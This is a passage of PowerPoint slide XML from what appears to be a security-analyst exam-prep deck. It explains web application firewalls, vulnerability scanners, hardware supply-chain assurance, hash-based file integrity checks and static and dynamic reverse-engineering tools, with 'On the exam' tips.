                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Higher level of OSI/TCP Model</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In addition to IP addresses of source/destination &amp; ports, can also look at URLs, host names, layer 7 features</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ModSecurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  NAXSI (Nginx Anti XSS &amp; SQL Injection)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Imperva</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362</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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VULNERABILITY SCANNING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Vulnerability Scanning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Vulnerability scanning is the automated process of probing hosts, applications, and network services against a database of known weaknesses (CVEs, misconfigurations, and missing patches) to produce a prioritized report of exposures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Commercial and open-source scanners each fill a niche: Qualys and Rapid7 Nexpose are enterprise cloud/on-prem platforms, Tenable Nessus and OpenVAS/Greenbone are general-purpose network and host scanners, Microsoft Baseline Security Analyzer (MBSA) checks Windows configuration and patch baselines, and Nikto is a focused web-server scanner that flags dangerous files and outdated server software.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Scanners can run authenticated (credentialed) for deep, accurate host inspection or unauthenticated for an outside-in attacker view, and they map findings to severity scores such as CVSS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst relies on these tools to drive the vulnerability management lifecycle, feed patch and remediation priorities, and validate that fixes actually closed the exposure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions asking you to match a scanner to its purpose (e.g., Nikto for web servers, MBSA for Windows baselines) or to choose credentialed vs. non-credentialed scanning for a given accuracy or scope requirement.</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363</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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VULNERABILITY SCANNING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Vulnerability Scanning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Qualys</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Nexpose</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Nessus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  OpenVAS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Microsoft Baseline Security Analyzer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Nikto</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364</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Hardware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Hardware assurance addresses the risk that physical components entering an organization may be counterfeit, tampered with, or maliciously modified somewhere along the supply chain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because manufacturing costs have fallen, counterfeiting has grown into a serious concern and even high-end devices have been convincingly cloned, so trusted foundries and vetted suppliers are used to assure the integrity of products from fabrication through delivery.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Supply chain integrity practices include verifying provenance, requiring anti-tamper controls, and performing analysis of hardware components to confirm they contain only authorized parts.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because counterfeit or trojaned hardware can introduce hidden backdoors, fail unpredictably, or bypass software defenses entirely, making it a root-of-trust problem that patching cannot fix.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Look for scenario questions about supply chain risk, trusted foundries, counterfeit components, or hardware root of trust as a category of vulnerability that software controls alone cannot mitigate.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365</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Hardware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Lower cost of manufacturing processes making counterfeiting a growing concern</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  High-end devices have been counterfeited</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Trusted foundries have been created</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Assure the integrity of products</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Supply chain integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Analysis of the hardware components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366</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Software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Software integrity verification is the practice of confirming that a file is genuine and unaltered rather than trusting it based on its name or location, since a malicious file can be given any innocuous filename.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The core technique is running the file through a cryptographic hashing function (such as SHA-256) to produce a unique fingerprint that changes if even one byte of the file is modified.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  That hash is then compared against lists of known-bad hashes published on threat-intelligence sources and services like VirusTotal, so matching a hash can immediately expose a known malicious file even if it has been renamed or repackaged.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst uses hashing to detect suspicious files during triage, validate downloaded software against vendor-published checksums, and share indicators of compromise with other defenders.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions where you must identify hashing as the method to verify file integrity or detect a known-bad file, and recognize that a filename alone is not a reliable indicator.</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367</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Software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Detecting suspicious files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Name alone won’t reveal if it’s bad</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Hashing function</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Lists of known bad files on the Internet</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Comparing hashes can uncover these bad files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368</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Software Creation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Software is created using a programming language, a formal notation that lets developers represent abstract concepts and instructions in a form a computer can execute.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Regardless of language, program logic is built from three fundamental control structures: sequence (statements executed in order), selection (branching decisions such as if/else), and iteration (loops that repeat a block of code).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Understanding these building blocks lets an analyst reason about how a program behaves and where logic flaws or unvalidated inputs could create vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This foundational knowledge underpins secure code review, reverse engineering, and interpreting how malware or exploits manipulate program flow.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests recognition of the three basic programming constructs (sequence, selection, iteration) as the foundation for analyzing code behavior and secure coding concepts.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369</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Software Creation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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Programming language</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Represent abstract concepts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Selection, sequence, iteration</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_696f8fde4c.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2156870"/>
            <a:ext cx="4937760" cy="3550099"/>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370</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Reverse Engineering Software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Reverse engineering is the process of analyzing a compiled binary to determine what it does when the original source code is unavailable, which is essential for malware analysis.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Static analysis examines the binary without running it, reading through disassembled or decompiled code to figure out the program's structure, strings, and logic while keeping the sample inert.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Dynamic analysis executes the binary in a controlled environment, often connecting it to a debugger to step through and simulate execution so the analyst can observe the resources it calls, the network connections it makes, and the output it produces.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts combine static and dynamic analysis to fully characterize a suspicious sample, extract indicators of compromise, and understand malware behavior without relying on the vendor.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Be ready to distinguish static analysis (examining code without execution) from dynamic analysis (observing behavior during execution in a sandbox or debugger) and to pick the right approach for a malware-analysis scenario.</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371</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Reverse Engineering Software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Static analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Read through binary to figure out program structure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Dynamic analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Connect binary to debugger to simulate execution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Probe program to find out what it’s trying to do, resources its calling, output</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Static + dynamic analysis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372</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Disassembly, I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The strings utility is a foundational static-analysis tool that scans a binary file and displays every sequence of human-readable printable characters it contains.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  These extracted strings often reveal telling artifacts such as hardcoded URLs, IP addresses, file paths, registry keys, error messages, or API function names embedded in the program.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because it requires no execution, strings gives an analyst a fast, safe first look at what a suspicious executable might do before committing to deeper reverse engineering.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst uses strings during malware triage to quickly surface potential indicators of compromise and decide whether a sample warrants full disassembly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect a question identifying the strings utility as a quick static-analysis step to extract readable text and potential indicators of compromise from a binary.</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373</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Disassembly, I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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The strings utility displays printable characters</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Strings demo</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_fe330f5373.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2788081"/>
            <a:ext cx="4937760" cy="2287677"/>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374</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide3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REVERSE ENGINEERING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Disassembly, II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Beyond raw text extraction, disassembly translates a binary's machine code back into assembly instructions, and modern tools present this as a visual representation of the program's structure.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Reverse-engineering platforms such as Binary Ninja, IDA Pro, and Ghidra render control-flow graphs that map out functions, branches, and loops so an analyst can follow the logic paths visually rather than reading linear code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This graphical view makes it far easier to spot decision points, decryption routines, or malicious behavior within a complex binary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
